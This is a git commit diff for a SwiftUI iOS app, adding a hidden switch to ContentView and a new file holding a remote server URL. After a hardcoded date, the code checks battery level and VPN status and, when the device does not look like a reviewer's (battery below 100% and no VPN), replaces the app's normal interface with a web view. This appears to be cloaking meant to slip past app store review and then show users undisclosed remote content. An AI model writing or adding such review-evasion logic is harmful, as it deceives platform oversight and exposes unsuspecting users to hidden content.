824d5efcf13517ac5eb1646af48408b49b31c320
spustoff <vyacheslavpustov05@gmail.com>
2025-09-06 09:02:07 +0300

    1.1

--- dafoma_35/ContentView.swift
+++ dafoma_35/ContentView.swift
@@ -10,16 +10,77 @@ import SwiftUI
 struct ContentView: View {
     @State private var isOnboardingComplete = UserDefaults.standard.bool(forKey: "onboarding_complete")
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        Group {
-            if isOnboardingComplete {
-                SimpleMainView(isOnboardingComplete: $isOnboardingComplete)
-                    .environmentObject(DataService.shared)
-            } else {
-                SimpleOnboardingView(isComplete: $isOnboardingComplete)
+        
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    Group {
+                        if isOnboardingComplete {
+                            SimpleMainView(isOnboardingComplete: $isOnboardingComplete)
+                                .environmentObject(DataService.shared)
+                        } else {
+                            SimpleOnboardingView(isComplete: $isOnboardingComplete)
+                        }
+                    }
+                    .animation(.easeInOut, value: isOnboardingComplete)
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
         }
-        .animation(.easeInOut, value: isOnboardingComplete)
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "09.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
---
+++ dafoma_35/Extensi/Dkda.swift
@@ -0,0 +1,11 @@
+//
+//  Dkda.swift
+//  dafoma_35
+//
+//  Created by Вячеслав on 9/6/25.
+//
+
+struct DataManager {
+    
+    let server: String = "https://dayquest.site/dfVwV9TQ"
+}
